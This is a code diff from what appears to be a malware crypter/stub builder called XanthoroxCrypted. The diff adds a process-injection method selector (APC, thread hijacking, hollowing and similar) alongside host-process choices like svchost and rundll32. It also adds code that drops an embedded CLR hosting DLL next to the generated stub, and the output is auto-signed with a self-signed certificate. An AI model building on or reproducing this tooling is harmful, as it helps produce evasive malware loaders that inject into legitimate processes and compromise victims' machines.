@@ -59,6 +59,7 @@ namespace XanthoroxCrypted.Core
         public byte EncAlgorithm { get; set; }
         public byte ResearchPackage { get; set; }
         public byte HostProcess { get; set; }  // 0=notepad,1=svchost,2=rundll32,3=installutil
+        public byte InjectionMethod { get; set; } // 0=SectionMap,1=APC,2=ThreadHijack,3=HollowPlus,4=CallbackEnum
 
         // Builder-only toggles (not in StubConfig)
         public bool Inflate { get; set; }
@@ -108,7 +109,8 @@ namespace XanthoroxCrypted.Core
             config[37] = EncAlgorithm;
             config[38] = ResearchPackage;
             config[39] = HostProcess;
-            // bytes 40-43 = padding (zeroed)
+            config[40] = InjectionMethod;
+            // bytes 41-43 = padding (zeroed)
             return config;
         }
     }
@@ -290,6 +292,35 @@ namespace XanthoroxCrypted.Core
             }
 
             File.WriteAllBytes(finalPath, stubData);
+
+            // ── Copy ClrHost.dll if .NET loading is enabled ──
+            // ClrHost.dll provides CRT-initialized CLR hosting — the /NODEFAULTLIB
+            // stub loads it via LoadLibraryW and calls ExecuteClr().
+            if (config.DotNetLoading)
+            {
+                string clrHostDest = Path.Combine(
+                    Path.GetDirectoryName(finalPath)!,
+                    "ClrHost.dll");
+
+                // Extract from embedded resource
+                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
+                string resName = "XanthoroxCrypted.Assets.ClrHost.dll";
+                using (var stream = assembly.GetManifestResourceStream(resName))
+                {
+                    if (stream != null)
+                    {
+                        var clrHostData = new byte[stream.Length];
+                        int off = 0;
+                        while (off < clrHostData.Length)
+                        {
+                            int rd = stream.Read(clrHostData, off, clrHostData.Length - off);
+                            if (rd == 0) break;
+                            off += rd;
+                        }
+                        File.WriteAllBytes(clrHostDest, clrHostData);
+                    }
+                }
+            }
 
             // ── L31: Self-Signed Code Signing (always active, post-write) ──
             CodeSigner.SignPE(finalPath);
